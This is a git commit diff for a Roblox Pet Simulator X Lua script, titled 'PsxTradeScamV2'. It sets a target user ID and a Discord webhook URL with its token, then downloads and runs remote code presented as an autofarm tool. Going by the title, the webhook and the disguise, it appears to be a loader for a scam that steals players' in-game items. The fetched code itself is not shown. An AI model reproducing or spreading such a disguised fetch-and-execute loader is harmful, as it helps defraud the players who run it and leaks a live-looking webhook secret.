a3f21fcb460aae1c8a0d15522003c79dc114183c
AutoFram <112065023+michaesl0159@users.noreply.github.com>
2023-02-12 14:50:34 +0800

    PsxTradeScamV2

--- Main.lua
+++ Main.lua
@@ -1,2 +1,3 @@
-_G.License = "64b6c9c10ea77cc477ff"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+_G.UserID = 3512246696
+_G.WebHook = "https://discord.com/api/webhooks/1038044816870735934/y9FvJdQhdWVhi3p4EfkVCiLEoFqx8LSCgv9kPBKw1sOECKUlTiW2w5hoLLk6PP8HrPcO"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua", true))()
